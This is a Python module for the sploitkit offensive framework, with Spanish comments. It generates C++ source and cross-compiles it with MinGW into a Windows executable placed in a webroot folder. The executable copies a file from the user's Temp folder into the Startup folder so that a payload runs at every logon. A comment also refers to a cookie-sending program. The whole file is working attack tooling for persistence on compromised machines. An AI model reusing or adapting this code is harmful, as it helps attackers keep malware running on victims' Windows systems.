from sploitkit import *
import os
import subprocess
from template import Procedure

class executing_payload(Module):
	""" Module used to create an exe that can execute powershell payloads.

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
        Option(
            'ARCHIVO_PERSISTENCIA',
            "Archivo que genera la persistencia en el sistema remoto.",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "persiste.exe"
    })

	def run(self):
		parent_path = "Prueba/sourcecodes/"
		parent_webroot_path = "Prueba/webroot/"

		archivo_origen = ''.join(list(self.config.get('ARCHIVO_PERSISTENCIA')))
		archivo_origen = "persiste.exe"
		
		name = "persiste.cpp"
		exename = "persiste"
		fullname = parent_path+name
		outfile = parent_webroot_path + exename
		


		PERSISTENCIA = '''
		#include <iostream>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define ORIGENARCHIVO "%s"
		#define DESTINOPATH "AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"
		using namespace std;
		//compilar: i686-w64-mingw32-g++ persiste.cpp -o persiste -static-libgcc -static-libstdc++

		int main(void){
			char username[UNLEN+1];
			DWORD username_len = UNLEN+1;
			GetUserName(username, &username_len);
			string user(username);
			string file_name = ORIGENARCHIVO;
			string origen_path = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + file_name;
			string destino_path = "C:\\\\Users\\\\" + user + "\\\\" + DESTINOPATH;
			string cmd = "COPY \\"" +  origen_path + "\\" \\"" + destino_path + "\\"";
			//printf("CMD: %%s", cmd.c_str());
			system(cmd.c_str());

		}
		''' %  (archivo_origen)

		f = open(fullname,"w")
		f.write(PERSISTENCIA)
		print("Archivo "+ fullname + " creado.")
		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
		subprocess.Popen(args)
		print("Compilado {}.".format(outfile))
